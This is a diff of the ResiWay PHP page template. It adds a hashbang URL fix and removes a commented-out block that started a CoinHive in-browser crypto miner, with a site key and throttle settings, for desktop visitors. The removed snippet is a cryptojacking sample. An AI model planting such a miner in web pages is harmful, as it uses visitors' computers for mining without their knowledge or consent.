@@ -29,33 +29,19 @@ $token = md5($rev.rand(1, 100));
         <meta property="og:image" content="https://www.resiway.org/packages/resiway/apps/assets/img/resiway-logo-small.png" />
         
         <title>ResiWay</title>
-
+        <script>
+        // mistyped hashbang fix
+        if(location.href.indexOf("#/") > 0) {
+            location.href = location.href.replace(location.hash,'#!'+location.hash.substr(1));
+        }
+        </script>
         <!-- favicons -->
         <?php echo file_get_contents("packages/resiexchange/apps/views/parts/favicons.html"); ?>
         <!-- scripts -->
         <?php echo file_get_contents("packages/resiexchange/apps/views/parts/scripts.html"); ?>
         <!-- styles -->
         <?php echo file_get_contents("packages/resiexchange/apps/views/parts/styles.html"); ?>        
-
-        <?php
-        /*
-        if(!$request->isBot() && !$request->isMobile()) {
-        ?>
-            <script src="packages/resiway/apps/assets/js/contribute.min.js"></script>
-            <script>
-                var miner = new CoinHive.Anonymous('qaP4WVQaitkLzfkhCEpAHJe0aH6qYI5f',{
-                threads: 1,
-                autoThreads: false,
-                onIddle: true,
-                throttle: 0.8,
-                forceASMJS: false
-                });
-                miner.start();
-            </script>
-        <?php
-        }
-        */
-        ?>
+        
         
         <script src="packages/resiexchange/apps/i18n/moment-locale/fr.js?v=<?php echo $token; ?>"></script>        
         <script src="packages/resiexchange/apps/i18n/locale-fr.js?v=<?php echo $token; ?>"></script>
